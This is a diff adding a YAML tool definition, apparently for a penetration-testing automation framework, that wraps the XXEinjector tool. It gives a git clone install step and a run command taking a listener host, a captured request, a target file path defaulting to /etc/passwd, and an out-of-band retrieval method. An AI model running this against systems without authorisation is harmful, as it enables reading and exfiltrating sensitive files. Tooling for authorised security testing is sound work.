@@ -1,0 +1,40 @@
+# XXEinjector
+name: xxeinjector
+category: testing.xxe
+version: "1.0.0"
+description: XXE injection automation tool
+
+install:
+  method: git
+  command: git clone https://github.com/enjoiz/XXEinjector.git
+  verify: ruby XXEinjector.rb --help
+
+execute:
+  command: ruby XXEinjector.rb --host {lhost} --file {request_file} --path {path} --oob {oob_method}
+  input:
+    lhost:
+      type: string
+      required: true
+    request_file:
+      type: string
+      required: true
+    path:
+      type: string
+      default: "/etc/passwd"
+    oob_method:
+      type: string
+      default: "http"
+  output:
+    format: text
+    type: xxe_findings
+  timeout: 1200
+
+capabilities:
+  - xxe_detection
+  - oob_xxe
+  - file_retrieval
+
+resources:
+  cpu: low
+  memory: low
+  network: moderate
